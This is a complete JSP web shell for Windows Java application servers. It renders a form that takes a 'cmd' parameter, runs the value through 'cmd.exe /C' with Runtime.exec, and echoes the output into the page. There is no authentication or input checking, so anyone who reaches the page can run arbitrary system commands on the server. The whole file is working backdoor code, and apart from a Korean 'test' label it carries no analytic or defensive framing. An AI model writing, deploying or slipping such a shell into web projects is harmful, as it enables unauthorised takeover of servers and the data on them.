<%@ page import="java.util.*, java.io.*, java.net.*" contentType="text/html; charset=utf-8;" pageEncoding="utf-8"%>

<HTML>
    <head>
        <meta charset="utf-8">
    </head>
    <BODY>
        Commands with JSP
        <FORM METHOD="GET" NAME="myform" ACTION="">
            <INPUT TYPE="text" NAME="cmd">
            <INPUT TYPE="submit" VALUE="Send">
        </FORM>
        <pre>
        <%
            if (request.getParameter("cmd") != null) {
                out.println("Command: " + request.getParameter("cmd") + "<BR>");
                Process p;
                p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                    // String test = URLEncoder.encode(disr, "UTF-8");
                    // String str = URLDecoder.decode(test, "euc-kr");
                    out.println(disr);
                    disr = dis.readLine();
                }
            }
        %>
        </pre>
        <span>테스트</span>
    </BODY>
</HTML>